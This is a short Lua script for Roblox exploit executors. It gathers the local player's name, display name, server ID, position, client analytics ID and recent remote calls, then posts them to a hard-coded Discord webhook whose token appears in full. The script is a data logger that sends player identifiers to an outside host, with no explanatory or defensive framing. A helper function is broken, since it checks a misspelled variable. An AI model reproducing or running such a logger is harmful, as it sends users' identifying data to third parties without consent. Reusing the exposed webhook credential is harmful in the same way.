local LocalPlayerManadear = game.Players.LocalPlayer
local DisplayName = game.Players.LocalPlayer.Character.Humanoid.DisplayName or nil
local function Returner(value)
    if Value == "Players" then
        ForEachNumBerOne = {}
        for _, v in pairs(game.Players.LocalPlayer:GetChildren()) do
            if v then
                table.insert(ForEachNumBerOne, tostring(v.Name))
            end
        end
        return ForEachNumBerOne
    end
end
local WebhookManadear = 'https://discord.com/api/webhooks/1228363192259055646/IERAwMtJsNQIlrLKdVZx8P0LSkF54i1mq3_xxKp7w1c762GN2e7exQyb6zV11nEfGt_y'
    request = http_request or request or HttpPost or syn.request or fluxus.request
    request({
        Url = WebhookManadear,
        Body = game.HttpService:JSONEncode({
            ['content']  = "```md\n> Game: " .. game.MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\n> Name: "..game.Players.LocalPlayer.Name.."\n> DisplayName: "..tostring(DisplayName).."\n> Server: "..tostring(game.JobId).."\n> PlaceId: "..tostring(game.PlaceId).."\n> CFrame: CFrame.new("..tostring(LocalPlayerManadear.Character.HumanoidRootPart.Position)..")".."\n> Kick From: Server-Side".."\n> Client: "..game:GetService("RbxAnalyticsService"):GetClientId().."\n> Lastest Remote: "..tostring(lastremote).."\n> Lastest Function Used: "..tostring(getgenv().LastFuntion).."\n> All Players: {"..tostring(Returner("Players")).."}"
        }),
        Method = "POST",
        Headers = {
            ['Content-Type'] = 'application/json',
        },
    })
